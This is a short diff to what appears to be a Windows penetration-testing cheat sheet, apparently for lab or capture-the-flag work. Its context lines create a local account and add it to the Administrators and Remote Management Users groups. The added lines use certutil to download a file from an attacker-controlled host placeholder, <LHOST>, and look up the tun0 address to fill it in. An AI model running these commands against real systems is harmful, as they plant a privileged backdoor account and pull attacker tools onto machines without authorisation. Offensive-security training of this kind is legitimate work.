@@ -33,3 +33,8 @@ net user <USERNAME> <PASSWORD> /add
 net localgroup Administrators <USERNAME> /add
 net localgroup "Remote Management Users" <USERNAME> /add
 
+# download
+certutil -urlcache -split -f http://<LHOST>/<FILE>
+certutil -urlcache -split -f http://<LHOST>:8000/<FILE>
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
